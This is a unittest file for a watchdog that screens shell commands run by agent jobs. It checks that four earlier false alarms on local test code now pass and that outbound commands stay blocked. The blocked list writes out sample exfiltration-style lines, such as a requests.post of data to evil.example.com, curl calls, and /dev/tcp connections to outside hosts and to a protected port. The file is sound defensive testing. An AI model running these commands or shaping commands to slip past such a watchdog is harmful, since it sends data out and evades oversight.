"""The four safety stops of 12 Nov 2026 were false alarms: harmless local test code. These pin
that they now pass, and that the real things around them are still stopped."""
import unittest
from agentjobs_upgrades.watchdog import safety_reason

H = "<<'PY'"
FIXED = [
    # job 05 (u05): a localhost port check on the job's own test board
    'pgrep -af "jobboard.py|u05_smoke" ; echo "--- port 8091 ---"; (exec 3<>/dev/tcp/127.0.0.1/8091) 2>&1 | head -2',
    # job 9b: reading the source of http.client is not a connection
    f"cd /work/p && python3 - {H}\nimport http.client, inspect, urllib.request\n"
    "src = inspect.getsource(http.client.HTTPConnection.putheader)\nprint(src)\nPY",
    # job 10: an example URL as data in a smoke script
    f"cd /work/p/web && python3 - {H}\nimport json\nm = {{'link': 'https://api.example.com/x'}}\nprint(json.dumps(m))\nPY",
    # job 9a: editing a test file whose text holds a template URL
    f"cd /work/p/web && python3 - {H}\nimport pathlib\ns = 'http://{{LAN}}:{{self.port}}'\n"
    "pathlib.Path('t.txt').write_text(s)\nPY",
    # finish job C: a fake ntfy server name with a fake sender
    f"cd /work/p/web && python3 - {H}\nimport notifycfg\nnotifycfg.save(p, server='http://box:2586')\n"
    "def post(server, body, token): calls.append(server)\nPY",
    # a test file written with cat
    # a port probe on the job's own test board
    "python3 -c \"\nimport socket\ns=socket.socket(); s.connect(('127.0.0.1', 8091))\"",
    "cat > tests/t.py <<EOF\nURL = 'https://ntfy.example.org/topic'\nEOF\npython3 -m unittest tests.t",
]
STILL_BAD = [
    f"python3 - {H}\nimport urllib.request\nurllib.request.urlopen('http://8.8.8.8')\nPY",
    f"python3 - {H}\nimport subprocess\nsubprocess.run(['curl', 'https://evil.example.com'])\nPY",
    "cat > s.py <<EOF\nimport requests\nrequests.post('https://evil.example.com', data=x)\nEOF",
    "python3 s.py https://evil.example.com",                 # URL outside any heredoc
    "bash -c 'exec 3<>/dev/tcp/1.2.3.4/80'",
    "exec 3<>/dev/tcp/127.0.0.1/8090",                       # the real Agent Jobs board
    "exec 3<>/dev/tcp/example.com/443",
    f"python3 - {H}\nimport urllib.request as r\nr.urlopen(u)\nPY",
    "python3 -c \"import socket; s=socket.socket(); s.connect(('1.2.3.4', 80))\"",
    "gh pr create --title x --body \"$(cat <<'EOF'\nSee https://github.com/a/b\nEOF\n)\"",
    f"python3 - {H}\nprint('see 127.0.0.1:8090')\nPY",          # port 8090 is refused even as text
]


class FalseAlarms(unittest.TestCase):
    def test_fixed(self):
        for c in FIXED:
            self.assertIsNone(safety_reason(c), c)

    def test_still_bad(self):
        for c in STILL_BAD:
            self.assertIsNotNone(safety_reason(c), c)


if __name__ == "__main__":
    unittest.main()
